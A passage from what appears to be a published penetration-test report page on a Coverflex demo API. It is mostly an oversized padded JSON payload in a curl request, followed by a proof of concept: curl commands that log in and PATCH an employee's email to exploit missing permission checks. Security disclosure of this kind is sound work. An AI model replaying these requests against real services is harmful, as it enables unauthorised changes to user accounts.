aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"}],\"description\":[{\"language\":\"pt-PT\"\"value\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"}],\"started_at\":\"2022-09-30\",\"ended_at\":null,\"recurrence\":\"one_time\",\"accrual\":false}}«$'https://demo-menhir-api.coverflex.com/api/business/budgets'</code></p>
+<h2 id="poc-arbitrary-unpriveleged-user-can-change-its-own-attributes-when-only-manager-should-by-communicating-with-the-api-directly">PoC Arbitrary unpriveleged user can change its own attributes when only manager should, by communicating with the API directly.</h2>
+<h3 id="instructions_3">Instructions</h3>
+<p>Login with this curl request, replacing the needed values  and saving the returning bearer token.</p>
+<p><code>curl -i -s -k -X $'POST' -H $'Host: demo-menhir-api.coverflex.com' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Content-Length: 78' -H $'Origin: https://people-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://people-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' --data-binary $'{\"email\":\"[EMAIL]\",\"password\":\"[PASSWORD]\"}' $'https://demo-menhir-api.coverflex.com/api/business/sessions'</code></p>
+<p>Grab an employee id and send a curl request like this, replacing [EMPLOYEE_ID] with your employee id, the token with your token and [EMAIL] with an arbitrary email.</p>
+<p><code>curl -i -s -k -X $'PATCH' -H $'Authorization: Bearer [TOKEN]'-H $'X-Coverflex-Version: 1.0.0' -H $'X-Coverflex-Channel: web' -H $'X-Coverflex-Language: en-GB' -H $'Content-Length: 415' -H $'Origin: https://my-demo.coverflex.com' -H $'Dnt: 1' -H $'Referer: https://my-demo.coverflex.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers'--data-binary $'{\"employee\":{\x0d\x0a\"email\":\"[EMAIL]\"\x0d\x0a}}' $'https://demo-menhir-api.coverflex.com/api/employee/909ba645-22d9-4b61-b21f-4180ba4020c5'</code></p>
+<h3 id="recomendations">Recomendations</h3>
+<p>Do not set sensitive properties based on a crafted API request, if needed so, make sure to ensure the user has the correct permissions to do so.</p>
+<h3 id="score_3">Score:</h3>
+<p>Informative</p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../../SAML/saml_notes/" class="btn btn-neutral float-left" title="SAML"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../neurowave/" class="btn btn-neutral float-right" title="NEUROWAVE, LDA">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../../SAML/saml_notes/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../neurowave/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../..';</script>
+    <script src="../../js/theme_extra.js" defer></script>
+    <script src="../../js/theme.js" defer></script>
+      <script src="../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
